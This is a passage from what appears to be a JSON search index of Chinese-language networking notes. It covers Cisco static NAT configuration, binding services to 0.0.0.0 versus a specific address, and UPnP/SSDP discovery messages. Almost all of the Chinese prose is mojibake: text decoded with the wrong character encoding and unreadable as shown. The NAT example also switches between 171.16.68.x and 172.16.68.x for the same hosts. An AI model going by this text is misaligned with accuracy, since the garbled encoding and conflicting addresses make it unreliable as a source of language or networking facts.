sourceå‘½ä»¤å®ç°\"å†…éƒ¨æœ¬åœ°åœ°å€\"åˆ°\"å†…éƒ¨å…¨å±€åœ°å€\"ä¹‹é—´çš„è½¬æ¢ï¼ˆæ—¢å¯ä»¥é‡‡ç”¨é™æ€NATæ–¹å¼å®ç°ï¼Œä¹Ÿå¯ä»¥é‡‡å–åŠ¨æ€NATæ–¹å¼å®ç°ï¼‰ï¼Œ åªéœ€è¦å®šä¹‰å†…éƒ¨æœ¬åœ°å€ä¸å†…éƒ¨æœ¬å±€åœ°å€çš„æ˜ å°„ã€‚ ä¸€ä¸ªç®€å•çš„NATè½¬æ¢ç¤ºä¾‹ è¿™æ˜¯ä¸€ä¸ªç®€å•çš„NATè½¬æ¢ç¤ºä¾‹ã€‚è¦å®ç°ä»¥ä¸‹ç›®çš„ï¼šå½“NATè·¯ç”±å™¨çš„å†…éƒ¨ç½‘ç»œs0æ¥å£ä¸Šæ¥æ”¶åˆ°ä¸€ä¸ªæºåœ°å€ä¸ºå†…éƒ¨æœ¬åœ°åœ°å€10.10.10.1ï¼Œ ç›®çš„IPåœ°å€ä¸ºå¤–éƒ¨æœ¬åœ°åœ°å€171.16.68.1çš„æ•°æ®åŒ…æ—¶ï¼Œåœ¨è½¬å‘åˆ°s1æ¥å£æ—¶ï¼ŒåŸæ¥æ•°æ®åŒ…æºåœ°å€çš„å†…éƒ¨æœ¬åœ°åœ°å€10.10.10.1è¢«è½¬æ¢æˆå†…éƒ¨å…¨å±€åœ°å€171.16.68.5ï¼Œ ä½†ç›®çš„åœ°å€ä¸å˜ï¼Œç„¶åç»§ç»­å‘é€ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ‰€è¿›è¡Œçš„åªæ˜¯æ•°æ®åŒ…ä¸­æºIPåœ°å€çš„è½¬æ¢ï¼Œç”±å†…éƒ¨æœ¬åœ°åœ°å€å‘å†…éƒ¨å…¨å±€åœ°å€è½¬æ¢ï¼Œä¸”åªæ˜¯å†…éƒ¨åœ°å€ä¹‹é—´çš„è½¬æ¢ã€‚ ç›¸åï¼Œå½“åœ¨NATè·¯ç”±å™¨çš„å¤–éƒ¨ç½‘ç»œæ¥å£s1ä¸Šæ¥æ”¶æºåœ°å€ä¸º172.16.68.1å¤–éƒ¨æœ¬åœ°åœ°å€ï¼Œ ç›®çš„åœ°å€ä¸ºå†…éƒ¨å…¨å±€åœ°å€172.16.68.5çš„å¤–éƒ¨æœåŠ¡å™¨å“åº”æ•°æ®åŒ…æ—¶ï¼Œç›®çš„åœ°å€å°†è¢«è½¬æ¢æˆ10.10.10.1è¿™ä¸ªå†…éƒ¨æœ¬åœ°åœ°å€ï¼Œç„¶åç»§ç»­å‘é€ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ‰€è¿›è¡Œçš„åªæ˜¯æ•°æ®åŒ…ä¸­ç›®çš„IPåœ°å€çš„è½¬æ¢ï¼Œç”±å†…éƒ¨å…¨å±€åœ°å€å‘å†…éƒ¨æœ¬åœ°åœ°å€è½¬æ¢ï¼Œä¹Ÿåªæ˜¯å†…éƒ¨åœ°å€ä¹‹é—´çš„è½¬æ¢ã€‚ ä¸‹é¢ä»…ä»¥é™æ€NATè½¬æ¢æ–¹å¼ä¸ºä¾‹ä»‹ç»å†…éƒ¨åœ°å€è½¬æ¢çš„é…ç½®æ­¥éª¤ï¼Œè¯¦ç»†çš„NATé…ç½®æ–¹æ³•å°†åœ¨æœ¬ç« åé¢å…·ä½“ä»‹ç»ã€‚ ï¼ˆ1ï¼‰ä½¿ç”¨\"ip nat inside source static\"å…¨å±€é…ç½®å‘½ä»¤å¯ç”¨åŸºäºå†…éƒ¨æºIPåœ°å€çš„é™æ€NAT IPåœ°å€è½¬æ¢ã€‚ ä¹Ÿå°±æ˜¯å®šä¹‰å†…éƒ¨æœ¬åœ°åœ°å€å’Œå†…éƒ¨å…¨å±€åœ°å€ï¼Œä½¿å®ƒä»¬ä¹‹é—´å½¢æˆä¸€ä¸€å¯¹åº”çš„æ˜ å°„å…³ç³»: Router(config)#ip nat inside source static 10.10.10.1 171.16.68.5 !--- åœ¨å†…éƒ¨æœ¬åœ°åœ°å€10.10.10.1ä¸å†…éƒ¨å…¨å±€åœ°å€171.16.68.5ä¹‹é—´å»ºç«‹é™æ€NATæ˜ å°„å…³ç³»ï¼Œä½¿å†…éƒ¨ç½‘ç»œä¸»æœºçŸ¥é“è¦ä»¥171.16.68.5è¿™ä¸ªåœ°å€åˆ°è¾¾å¤–éƒ¨ç½‘ç»œä¸»æœº ï¼ˆ2ï¼‰ä½¿ç”¨ä»¥ä¸‹ä¸¤æ¡è¯­å¥é…ç½®è·¯ç”±å™¨çš„s0ä¸ºNATçš„å†…éƒ¨ç½‘ç»œæ¥å£: Router(config)#interface s0 !--- è¿›å…¥s0ä¸²å£é…ç½®æ¨¡å¼ Router(config-if)#ip nat inside !--- æŠŠs0ä¸²å£æŒ‡å®šä¸ºå†…éƒ¨ç½‘ç»œæ¥å£ ï¼ˆ3ï¼‰ä½¿ç”¨ä»¥ä¸‹ä¸¤æ¡è¯­å¥é…ç½®è·¯ç”±å™¨çš„s1ä¸ºNATçš„å¤–éƒ¨ç½‘ç»œæ¥å£: Router(config)#interface s1 !--- è¿›å…¥s1ä¸²å£é…ç½®æ¨¡å¼ Router(config-if)#ip nat outside !--- æŠŠs1ä¸²å£æŒ‡å®šä¸ºå¤–éƒ¨ç½‘ç»œæ¥å£ ï¼ˆ4ï¼‰ä½¿ç”¨show ip nat translationsç‰¹æƒæ¨¡å¼å‘½ä»¤éªŒè¯ä¸Šè¿°è¿›è¡Œçš„è·¯ç”±å™¨NATé…ç½®ã€‚ è¾“å‡ºä¿¡æ¯ä¸­æ˜¾ç¤ºä»¥ä¸Šé…ç½®çš„NATæ¡ç›®é…ç½®ä¸ºï¼šå†…éƒ¨æœ¬åœ°åœ°å€ä¸º10.10.10.1ï¼Œå†…éƒ¨å…¨å±€åœ°å€ä¸º171.16.68.5ã€‚ è¿™ä¸ä¸Šé¢çš„é…ç½®æ˜¯ä¸€è‡´çš„ï¼Œè¯æ˜é…ç½®æ˜¯æˆåŠŸçš„: Router#show ip nat translations !--- åœ¨ç‰¹æƒæ¨¡å¼ä¸‹æ˜¾ç¤ºå½“å‰è·¯ç”±å™¨NATé…ç½® Pro Inside global Inside local Outside local Outside global --- 171.16.68.5 10.10.10.1 --- --- æ­¤æ—¶å¦‚æœå¯¹å¤–éƒ¨ç½‘ç»œç›®çš„ä¸»æœºè¿›è¡Œpingæ“ä½œï¼Œå°±ä¼šæœ‰æ•°æ®åŒ…ä»å†…éƒ¨ç½‘ç»œè½¬å‘åˆ°å¤–éƒ¨ç½‘ç»œã€‚ ç„¶åå†åœ¨è·¯ç”±å™¨ç‰¹æƒæ¨¡å¼ä¸‹æ‰§è¡Œ\"show ip nat translations\"å‘½ä»¤ï¼Œæ˜¾ç¤ºçš„NATä¿¡æ¯å¦‚ä¸‹ã€‚ å¤šäº†ä¸€æ¡icmpåè®®ç±»å‹æ•°æ®åŒ…ï¼ˆæ‰§è¡Œpingæ“ä½œååŠ çš„ï¼‰æ˜¾ç¤ºï¼Œä½†å› ä¸ºæ­¤æ—¶æ²¡æœ‰é…ç½®å¤–éƒ¨ç½‘ç»œçš„æœ¬åœ°åœ°å€å’Œå…¨å±€åœ°å€ï¼Œ æ‰€ä»¥æ˜¾ç¤ºçš„å¤–éƒ¨æœ¬åœ°åœ°å€å’Œå¤–éƒ¨å…¨å±€åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯pingæ“ä½œç›®çš„ä¸»æœºåœ°å€171.16.68.1: Router#show ip nat translations Pro Inside global Inside local Outside local Outside global icmp 171.16.68.5:15 10.10.10.1:15 171.16.68.1:15 171.16.68.1:15 --- 171.16.68.5 10.10.10.1 --- --- é€šè¿‡ä»¥ä¸Šé…ç½®åï¼Œä»å†…éƒ¨ç½‘ç»œå‘å¾€å¤–éƒ¨ç½‘ç»œçš„æ•°æ®åŒ…åªæ˜¯æºåœ°å€ï¼ˆSAï¼‰å°† åœ¨ç»è¿‡è·¯ç”±å™¨åè¿›è¡Œè½¬æ¢ï¼ˆç”±å†…éƒ¨æœ¬åœ°åœ°å€10.10.10.1è½¬æ¢æˆå†…éƒ¨å…¨å±€åœ°å€171.16.68.5ï¼‰ï¼Œä½†ç›®æ ‡åœ°å€ï¼ˆDAï¼‰ä¸å˜ï¼Œ ä½†ä»å¤–éƒ¨ç½‘ç»œå‘å¾€å†…éƒ¨ç½‘ç»œçš„åº”ç­”æ•°æ®åŒ…çš„æºåœ°å€æ²¡æœ‰æ”¹å˜ï¼Œ åªæ˜¯ç»è¿‡è·¯ç”±å™¨åçš„æ•°æ®åŒ…ç›®çš„åœ°å€å‘ç”Ÿäº†è½¬æ¢ï¼ˆç”±å†…éƒ¨å…¨å±€åœ°å€172.16.68.5è½¬æ¢æˆå†…éƒ¨æœ¬åœ°åœ°å€10.10.10.1ï¼‰ï¼Œ ä½†æºåœ°å€ï¼ˆSAï¼‰ä¸å˜ã€‚å› ä¸ºæ­¤æ—¶è¿˜æ²¡æœ‰ä¸ºNATè·¯ç”±å™¨é…ç½®å¤–éƒ¨ç½‘ç»œçš„æœ¬åœ°åœ°å€å’Œå…¨å±€åœ°å€è½¬æ¢ã€‚ æ­¤æ—¶ï¼Œæ•°æ®åŒ…åœ¨å†…ã€å¤–éƒ¨ç½‘ç»œä¸­çš„æºåœ°å€ã€ç›®çš„åœ°å€çš„è½¬æ¢æ–¹å¼å‚å¦‚å›¾ åœ¨å†…éƒ¨åœ°å€çš„NATè½¬æ¢ä¸­ï¼Œæ— è®ºæ•°æ®åŒ…æ¥è‡ªå“ªé‡Œï¼Œæ•°æ®åŒ…ä¸­åœ°å€å˜åŒ–çš„åªæ˜¯å†…éƒ¨åœ°å€ä¹‹é—´çš„è½¬æ¢ã€‚ ä½†è¦æ³¨æ„ï¼Œåœ°å€å˜åŒ–æ‰€å¯¹åº”çš„æ˜¯æºåœ°å€ï¼Œè¿˜æ˜¯ç›®çš„åœ°å€æ˜¯è¦çœ‹æ•°æ®åŒ…æ˜¯æ¥è‡ªå†…éƒ¨ç½‘ç»œï¼Œ è¿˜æ˜¯æ¥è‡ªå¤–éƒ¨ç½‘ç»œï¼šå¦‚æœæ˜¯æ¥è‡ªå†…éƒ¨ç½‘ç»œï¼Œè½¬æ¢æ˜¯æºåœ°å€ï¼›å¦‚æœæ˜¯æ¥è‡ªå¤–éƒ¨ç½‘ç»œï¼Œè½¬æ¢çš„æ˜¯ç›®çš„åœ°å€ã€‚ å¤–éƒ¨åœ°å€NATè½¬æ¢åŸç† å½“å…¬å¸æœåŠ¡å™¨ä½äºå†…éƒ¨ç½‘ç»œï¼Œä½¿ç”¨å†…éƒ¨ç½‘ç»œç§æœ‰IPåœ°å€ï¼Œä¸ºäº†æ–¹ä¾¿å¤–éƒ¨ç½‘ç»œç”¨æˆ·å¯¹å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼Œ åˆ™éœ€è¦ä½¿ç”¨ip nat outside sourceå‘½ä»¤é…ç½®\"å¤–éƒ¨å…¨å±€åœ°å€\"ä¸\"å¤–éƒ¨æœ¬åœ°åœ°å€\"ä¹‹é—´ çš„è½¬æ¢ï¼ˆæ—¢å¯ä»¥é‡‡ç”¨é™æ€NATæ–¹å¼å®ç°ï¼Œä¹Ÿå¯ä»¥é‡‡å–åŠ¨æ€NATæ–¹å¼å®ç°ï¼‰ã€‚ å¤–éƒ¨åœ°å€NATè½¬æ¢ä¸ä¸ŠèŠ‚ä»‹ç»çš„å†…éƒ¨åœ°å€NATè½¬æ¢æ˜¯ç›¸åçš„ï¼Œå®ƒä»…éœ€è¦å®šä¹‰å¤–éƒ¨åœ°å€ï¼ˆåŒ…æ‹¬å¤–éƒ¨æœ¬åœ°åœ°å€å’Œå¤–éƒ¨å…¨å±€åœ°å€ï¼‰ã€‚ ä¸‹é¢åŒæ ·ä»¥ä¸Šé¢é‚£ä¸ªç®€å•çš„NATè½¬æ¢ç¤ºä¾‹è¿›è¡Œä»‹ç»ã€‚ æœ¬ç¤ºä¾‹è¦å®ç°çš„ç›®çš„æ˜¯ï¼š å½“NATè·¯ç”±å™¨å¤–éƒ¨ç½‘ç»œæ¥å£s1æ¥æ”¶åˆ°æ¥è‡ªå¤–éƒ¨ç½‘ç»œç”¨æˆ·å‘é€çš„æºIPåœ°å€ä¸ºå¤–éƒ¨å…¨å±€åœ°å€171.16.68.1ï¼Œ ç›®çš„åœ°å€ä¸ºå¤–éƒ¨æœ¬åœ°åœ°å€10.10.10.1çš„æ•°æ®åŒ…åœ¨è¢«è·¯ç”±å™¨è½¬å‘åˆ°s0æ¥å£æ—¶ï¼Œ æ•°æ®åŒ…ä¸­çš„æºIPåœ°å€è½¬å˜ä¸ºå¤–éƒ¨æœ¬åœ°åœ°å€10.10.10.5ï¼ˆå³ç”±å¤–éƒ¨å…¨å±€åœ°å€è½¬æ¢æˆå¤–éƒ¨æœ¬åœ°åœ°å€ï¼‰ï¼Œ ç›®çš„IPåœ°å€ä¸å˜ï¼Œå³ä¹Ÿåªæ˜¯æºIPåœ°å€çš„è½¬æ¢ï¼›è€Œç”±å†…éƒ¨ç½‘ç»œç”¨æˆ·å‘é€çš„å“åº”æ•°æ®åŒ…ä¸­ï¼Œ å´åªæ˜¯ç›®çš„IPåœ°å€ï¼ˆå³ç”±å¤–éƒ¨æœ¬åœ°åœ°å€è½¬æ¢ä¸ºå¤–éƒ¨å…¨å±€åœ°å€ï¼‰çš„è½¬æ¢ï¼ŒæºIPåœ°å€ä¸å˜ã€‚ ä¸‹é¢ä»…ä»¥é™æ€NATè½¬æ¢æ–¹å¼ä¸ºä¾‹ä»‹ç»å¤–éƒ¨åœ°å€NATè½¬æ¢çš„é…ç½®æ­¥éª¤ï¼Œè¯¦ç»†çš„NATé…ç½®æ–¹æ³•å°†åœ¨æœ¬ç« åé¢å…·ä½“ä»‹ç»ã€‚ ï¼ˆ1ï¼‰ä½¿ç”¨ip nat outside source staticå…¨å±€é…ç½®å‘½ä»¤å¯ç”¨åŸºäºå¤–éƒ¨æºIPåœ°å€çš„é™æ€NAT IPåœ°å€è½¬æ¢ã€‚ ä¹Ÿå°±æ˜¯å®šä¹‰å¤–éƒ¨å…¨å±€åœ°å€å’Œå¤–éƒ¨æœ¬åœ°åœ°å€ä¹‹é—´çš„æ˜ å°„å…³ç³»: Router(config)#ip nat outside source static 171.16.68.1 10.10.10.5 !--- åœ¨å¤–éƒ¨å…¨å±€åœ°å€171.16.68.1ä¸å¤–éƒ¨æœ¬åœ°åœ°å€10.10.10.5ä¹‹é—´å»ºç«‹é™æ€NATè½¬æ¢å…³ç³»ï¼Œä½¿å¤–éƒ¨ç½‘ç»œä¸»æœºçŸ¥é“è¦ä»¥10.10.10.1è¿™ä¸ªåœ°å€åˆ°è¾¾å†…éƒ¨ç½‘ç»œä¸»æœº ï¼ˆ2ï¼‰ä½¿ç”¨ä»¥ä¸‹ä¸¤æ¡è¯­å¥é…ç½®è·¯ç”±å™¨çš„s0ä½œä¸ºNATçš„å†…éƒ¨ç½‘ç»œæ¥å£: Router(config)#interface s0 Router(config-if)#ip nat inside ï¼ˆ3ï¼‰ä½¿ç”¨ä»¥ä¸‹ä¸¤æ¡è¯­å¥é…ç½®è·¯ç”±å™¨çš„s1ä½œä¸ºNATçš„å¤–éƒ¨ç½‘ç»œæ¥å£: Router(config)#interface s1 Router(config-if)#ip nat outside æ³¨è§£ å¯¹äºç‰¹å®šçš„NATç½‘ç»œæ¥è¯´ï¼Œè·¯ç”±å™¨ä¸Šçš„å†…ã€å¤–éƒ¨ç½‘ç»œæ¥å£æ˜¯å›ºå®šçš„ï¼Œä¸ä¼šéšç€é€šä¿¡æ–¹å‘çš„æ”¹å˜è€Œæ”¹å˜ã€‚ å¦‚åœ¨ä¸ŠèŠ‚ä»‹ç»çš„å†…éƒ¨åœ°å€çš„NATè½¬æ¢ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åŒæ ·æ˜¯æŠŠs0æ¥å£ä½œä¸ºå†…éƒ¨ç½‘ç»œæ¥å£ï¼Œs1æ¥å£ä½œä¸ºå¤–éƒ¨ç½‘ç»œæ¥å£ã€‚ ï¼ˆ4ï¼‰ä½¿ç”¨show ip nat translationsç‰¹æƒæ¨¡å¼å‘½ä»¤éªŒè¯ä¸Šè¿°è¿›è¡Œçš„è·¯ç”±å™¨NATé…ç½®ã€‚ ä»ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶NATçš„å¤–éƒ¨æœ¬åœ°åœ°å€ä¸º10.10.10.5ï¼Œå¤–éƒ¨å…¨å±€åœ°å€ä¸º171.16.68.1ã€‚è¿™ä¸ä¸Šé¢çš„é…ç½®æ˜¯ä¸€è‡´çš„ï¼Œè¯æ˜é…ç½®æ˜¯æˆåŠŸçš„: Router#show ip nat translations Pro Inside global Inside local Outside local Outside global --- --- --- 10.10.10.5 171.16.68.1 åŒæ ·ï¼Œå¦‚æœæ­¤æ—¶æ‰§è¡Œä¸€ä¸ªä»å¤–éƒ¨ç½‘ç»œä¸»æœºï¼ˆ171.16.68.1ï¼‰åˆ°å†…éƒ¨ç½‘ç»œä¸»æœºï¼ˆ10.10.10.1ï¼‰çš„pingæ“ä½œï¼Œ ç„¶åå†åœ¨è·¯ç”±å™¨ç‰¹æƒæ¨¡å¼ä¸‹æ‰§è¡Œ\"show ip nat translations\"å‘½ä»¤ï¼Œåˆ™æ˜¾ç¤ºå¦‚ä¸‹ç»“æœã€‚ å› ä¸ºæ­¤æ—¶ä»…é…ç½®äº†å¤–éƒ¨æœ¬åœ°åœ°å€å’Œå¤–éƒ¨å…¨å±€åœ°å€ï¼Œæ‰€ä»¥ç»“æœä¸­æ˜¾ç¤ºçš„å†…éƒ¨æœ¬åœ°åœ°å€å’Œå…¨å±€åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯pingæ“ä½œç›®çš„ä¸»æœºåœ°å€10.10.10.1: Router#show ip nat translations Pro Inside global Inside local Outside local Outside global --- --- --- 10.10.10.5 171.16.68.1 icmp 10.10.10.1:37 10.10.10.1:37 10.10.10.5:37 171.16.68.1:37 ä¸ä¸ŠèŠ‚ä»‹ç»çš„ä»…é…ç½®å†…éƒ¨åœ°å€ç›¸åï¼Œæ­¤å¤„ä»å¤–éƒ¨ç½‘ç»œå‘å¾€å†…éƒ¨ç½‘ç»œçš„æ•°æ®åŒ…çš„æºIPåœ°å€ï¼ˆSAï¼‰å°† åœ¨ç»è¿‡è·¯ç”±å™¨åè¿›è¡Œè½¬æ¢ï¼ˆç”±å¤–éƒ¨å…¨å±€åœ°å€171.16.68.1è½¬æ¢æˆå¤–éƒ¨æœ¬åœ°åœ°å€10.10.10.5ï¼‰ï¼Œä½†ç›®æ ‡åœ°å€ï¼ˆDAï¼‰ä¸å˜ï¼› ä½†ä»å†…éƒ¨ç½‘ç»œå‘å¾€å¤–éƒ¨ç½‘ç»œçš„å“åº”æ•°æ®åŒ…çš„æºIPåœ°å€æ²¡æœ‰æ”¹å˜ï¼Œ åªæ˜¯ç»è¿‡è·¯ç”±å™¨åçš„æ•°æ®ç›®çš„IPåœ°å€å‘ç”Ÿäº†æ”¹å˜ï¼ˆç”±å¤–éƒ¨æœ¬åœ°åœ°å€10.10.10.5è½¬æ¢æˆå¤–éƒ¨å…¨å±€åœ°å€171.16.68.1ï¼‰ã€‚ å› ä¸ºæ­¤æ—¶è¿˜æ²¡æœ‰ä¸ºNATè·¯ç”±å™¨é…ç½®å†…éƒ¨æœ¬åœ°åœ°å€å’Œå†…éƒ¨å…¨å±€åœ°å€è½¬æ¢ã€‚æ­¤æ—¶ï¼Œæ•°æ®åŒ…åœ¨å†…ã€å¤–éƒ¨ç½‘ç»œä¸­çš„æºIPåœ°å€ã€ç›®çš„IPåœ°å€çš„è½¬æ¢æ–¹å¼å¦‚å›¾6-12æ‰€ç¤ºã€‚ ã€ç»éªŒä¹‹è°ˆã€‘åœ¨ä»…è¿›è¡Œå¤–éƒ¨åœ°å€NATè½¬æ¢æ—¶ï¼Œæ— è®ºæ•°æ®åŒ…æ¥è‡ªå“ªé‡Œï¼Œæ•°æ®åŒ…ä¸­åœ°å€å˜åŒ–çš„åªæ˜¯å¤–éƒ¨åœ°å€ä¹‹é—´çš„è½¬æ¢ã€‚ åŒæ ·ä¹Ÿéœ€æ³¨æ„ï¼Œåœ°å€å˜åŒ–æ‰€å¯¹åº”çš„æ˜¯æºIPåœ°å€ï¼Œè¿˜æ˜¯ç›®çš„IPåœ°å€æ˜¯è¦çœ‹æ•°æ®åŒ…æ˜¯æ¥è‡ªå†…éƒ¨ç½‘ç»œï¼Œ è¿˜æ˜¯æ¥è‡ªå¤–éƒ¨ç½‘ç»œï¼šå¦‚æœæ¥è‡ªå†…éƒ¨ç½‘ç»œï¼Œè½¬æ¢æ˜¯ç›®çš„IPåœ°å€ï¼› å¦‚æœæ¥è‡ªå¤–éƒ¨ç½‘ç»œï¼Œè½¬æ¢çš„æ˜¯æºIPåœ°å€ã€‚è¿™ä¸å‰é¢çš„å†…éƒ¨åœ°å€NATè½¬æ¢æ˜¯å¯¹åº”ç›¸åçš„ã€‚","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-NAT-mode-in-the-network.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-NAT-mode-in-the-network.html"},{"title":"ç½‘ç»œå¸¸è¯†","text":"å› ä¸ºæ²¡ä¸»æ”»è¿‡è¿™ä¸ªæ–¹å‘, æ‰€ä»¥å¾ˆå¤šä¸œè¥¿äº†è§£çš„ç®—æ¨¡æ¨¡ç³Šç³Š. åœ¨æ­¤å¤„å¯¹ä¸€äº›çŸ¥è¯†åšä¸€ä¸ªè®°å½•. webæœåŠ¡å¯åŠ¨åœ¨0.0.0.0ä¸å¯åŠ¨åœ¨æœ¬æœºipçš„åŒºåˆ« ä¸¾ä¾‹è¯´æ˜, è‹¥æœ¬åœ°ipä¸º 192.168.1.12, ç„¶åè¿è¡Œäº†ä¸€ä¸ªwebæœåŠ¡, è‹¥åªç»‘å®šåˆ° 127.0.0.1: 8080: åªèƒ½ 127.0.0.1: 8080 æœ¬åœ°è®¿é—® è‹¥å°†æœåŠ¡ç»‘å®šåˆ° 192.168.1.12:8080: å¯ä»¥ä» 127.0.0.1:8080 æœ¬åœ°è®¿é—® å¯ä»¥ä» 192.168.1.12:8080 è®¿é—®(æ”¯æŒæœ¬åœ°ä¸å±€åŸŸç½‘å†…åŒç½‘æ®µæœºå™¨è®¿é—®) è‹¥å°†æœåŠ¡ç»‘å®šåˆ° 0.0.0.0: 8080: ä¸Šé¢çš„ 192.168.1.12 ä¸ 127 éƒ½å¯ä»¥è®¿é—® è¿˜å¯ä»¥é€šè¿‡æœ¬æœº å…¬ç½‘ip:8080 è®¿é—® åŒºåˆ«å°±æ˜¯ 0.0.0.0 æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ IP åœ°å€, è¡¨ç¤ºä¼šç›‘å¬æœ¬æœºæ‰€æœ‰ç½‘ç»œæ¥å£ , æ¯”å¦‚æœ¬æœºé…ç½®äº†å¤šä¸ªipçš„æ—¶å€™, æˆ–è€…æƒ³åŒæ—¶è¿è¡Œåœ¨æœ¬åœ°ä¸å…¬ç½‘çš„æ—¶å€™, å°±å¾ˆæœ‰ç”¨. åªæ˜¯æœ¬æœºæµ‹, è·‘ä¸ª127å°±è¡Œäº†. ç½‘æ®µ/IP ä¸€èˆ¬ä¸€ä¸ªç½‘æ®µå­ç½‘å†…, ä»¥192.168.2.0 ä¸¾ä¾‹, 192.168.2.0 è¡¨ç¤ºè¿™ä¸ªç½‘æ®µ (æ˜¯ä¸€ä¸ªç½‘ç»œåœ°å€è€Œéä¸»æœºåœ°å€) 192.168.2.1 è¡¨ç¤ºæ­¤ç½‘æ®µçš„ç½‘å…³ 192.168.2.255 è¡¨ç¤ºå¹¿æ’­åœ°å€","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-Network-common-sense.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Network-common-sense.html"},{"title":"upnpæµç¨‹è¯¦ç»†ä»‹ç»","text":"å¤§ä½“ä¸Šæ˜¯ä»¥ä¸‹æµç¨‹ åœ°å€åˆ†é… UPnP è®¾å¤‡åŠ å…¥ç½‘ç»œå,é€šè¿‡è‡ªåŠ¨é…ç½®æˆ–åŠ¨æ€ä¸»æœºé…ç½®åè®®(DHCP)è·å¾—ä¸€ä¸ª IP åœ°å€ã€‚ å¯¹äºåœ¨ä¸ªäººpcä¸Šè‡ªè¡Œå¼€å‘è€Œè¨€, ä¸€èˆ¬è¿™ä¸€æ­¥åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨ç”µè„‘çš„æ—¶å€™å·²ç»åšäº†. å‘ç° UPnP è®¾å¤‡é€šè¿‡ç®€å•æœåŠ¡å‘ç°åè®®(SSDP)å¹¿æ’­è‡ªå·±çš„å­˜åœ¨,å¹¶ä¾¦å¬å…¶ä»–è®¾å¤‡çš„å¹¿æ’­ã€‚å‘ç°è¿‡ç¨‹ä¸­äº¤æ¢è®¾å¤‡çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€URL ç­‰ä¿¡æ¯ã€‚ ä½¿ç”¨ UDP åè®®. UPnPè®¾å¤‡å‘ç°è¿‡ç¨‹ä¸­çš„æ‰€æœ‰UDPæ¶ˆæ¯éƒ½ä½¿ç”¨ä»¥ä¸‹æ ¼å¼: METHOD * HTTP/1.1 HOST: 239.255.255.250:1900 [å…¶ä»–å¤´éƒ¨] METHODæŒ‡æ˜æ¶ˆæ¯ç±»å‹,å¯ä»¥æ˜¯NOTIFYã€M-SEARCHç­‰ * è¡¨ç¤ºå‘é€åˆ°æ‰€æœ‰è®¾å¤‡ HOSTæŒ‡å®šç›®çš„åœ°å€æ˜¯SSDPçš„ç»„æ’­åœ°å€å’Œç«¯å£1900 å…¶ä»–å¤´éƒ¨æ ¹æ®æ¶ˆæ¯ç±»å‹ä¸åŒè€Œä¸åŒ ssdp:alive é€šå‘Šæ¶ˆæ¯ å½“è®¾å¤‡ç¬¬ä¸€æ¬¡åŠ å…¥ç½‘ç»œæˆ–éœ€è¦æ›´æ–°è¿‡æœŸæ—¶é—´æ—¶,ä¼šä¸»åŠ¨å‘é€ssdp:aliveé€šå‘Šæ¶ˆæ¯. å‘ç½‘ç»œå‘ŠçŸ¥è®¾å¤‡åŠ å…¥ - NOTIFY: NOTIFY * HTTP/1.1 HOST: 239.255.255.250:1900 CACHE-CONTROL: max-age=1800 LOCATION: http://192.168.1.20:5678/device.xml NT: upnp:rootdevice NTS: ssdp:alive USN: uuid:f40c2981-7329-40b7-8b04-27f187aecfb5 å…¶ä¸­: NOTIFY: ä¸€ä¸ªé€šå‘Šæ¶ˆæ¯ HOST: ç›®çš„åœ°å€æ˜¯SSDPç»„æ’­åœ°å€,ç«¯å£å·1900 CACHE-CONTROL: æŒ‡å®šé€šå‘Šæ¶ˆæ¯çš„è¿‡æœŸæ—¶é—´1800ç§’ LOCATION: æä¾›è®¾å¤‡æè¿°æ–‡æ¡£çš„URL NT: æè¿°è®¾å¤‡ç±»å‹,è¿™é‡Œæ˜¯upnp:rootdeviceè¡¨ç¤ºæ ¹è®¾å¤‡ USN: æä¾›è®¾å¤‡çš„UUID M-SEARCHæœç´¢æ¶ˆæ¯ è®¾å¤‡æœç´¢, å½“æ§åˆ¶ç‚¹åŠ å…¥ç½‘ç»œæˆ–éœ€è¦å‘ç°è®¾å¤‡æ—¶,ä¼šå‘é€M-SEARCHæœç´¢æ¶ˆæ¯: M-SEARCH * HTTP/1.1 HOST: 239.255.255.250:1900 MAN: ssdp:discover MX: 3 ST: ssdp:all MXï¼šè®¾ç½®è®¾å¤‡å“åº”æœ€é•¿ç­‰å¾…æ—¶é—´ï¼Œè®¾å¤‡å“åº”åœ¨0å’Œè¿™ä¸ªå€¼ä¹‹é—´éšæœºé€‰æ‹©å“åº”å»¶è¿Ÿçš„å€¼ STï¼šè®¾ç½®æœåŠ¡æŸ¥è¯¢çš„ç›®æ ‡ï¼Œå®ƒå¿…é¡»æ˜¯ä¸‹é¢çš„ç±»å‹ï¼š ssdp:all æœç´¢æ‰€æœ‰è®¾å¤‡å’ŒæœåŠ¡ upnp:rootdevice ä»…æœç´¢ç½‘ç»œä¸­çš„æ ¹è®¾å¤‡ uuid:device-UUID æŸ¥è¯¢UUIDæ ‡è¯†çš„è®¾å¤‡ urn:schemas-upnp-org:device:device-type :{version} æŸ¥è¯¢device-Typeå­—æ®µ æŒ‡å®šçš„è®¾å¤‡ç±»å‹ï¼Œè®¾å¤‡ç±»å‹å’Œç‰ˆæœ¬ç”±UPNPç»„ç»‡å®šä¹‰ urn:schemas-upnp-org:service:service-type :{version} æŸ¥è¯¢service-Typeå­—æ®µ æŒ‡å®šçš„æœåŠ¡ç±»å‹ï¼ŒæœåŠ¡ç±»å‹å’Œç‰ˆæœ¬ç”±UPNPç»„ç»‡å®šä¹‰ æœç´¢ç½‘ç»œä¸Šçš„æ‰€æœ‰è®¾å¤‡ã€‚è®¾å¤‡éœ€åœ¨3ç§’å†…è¿”å›å“åº”ã€‚ ssdp:response å“åº”æ¶ˆæ¯ å½“è®¾å¤‡æ¥æ”¶åˆ° M-SEARCHæœç´¢æ¶ˆæ¯ 